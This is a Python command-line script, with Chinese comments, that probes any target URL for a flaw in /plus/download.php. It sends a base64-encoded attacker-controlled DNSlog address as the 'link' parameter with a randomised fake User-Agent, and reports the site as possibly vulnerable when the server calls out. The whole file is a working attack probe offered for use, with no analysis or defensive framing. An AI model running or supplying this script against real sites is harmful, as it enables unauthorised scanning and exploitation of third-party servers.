import requests
import argparse
from faker import Faker
import base64

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/plus/download.php',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')
parser.add_argument('-d', '--DNSlog', type=str, help='输入你的DNSlog地址')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/plus/download.php"  # 移除末尾的斜杠
    else:
        url = args.url + "/plus/download.php"
    if args.DNSlog:
        bytes_data = args.DNSlog.encode("utf-8")          # 转换为字节
        base64_str = base64.b64encode(bytes_data).decode("utf-8")  # Base64 编码
    else:
        print("Please provide a valid DNSlog using -d or --DNSlog argument.")
        exit()
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()


headers = {
    'User-Agent': fake.user_agent(),
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'gzip'
}

params = {
    "open": "1",
    "link": base64_str  # Base64 编码的链接
}

response = requests.get(url, headers=headers,params=params)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞，请查看DNSlog")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)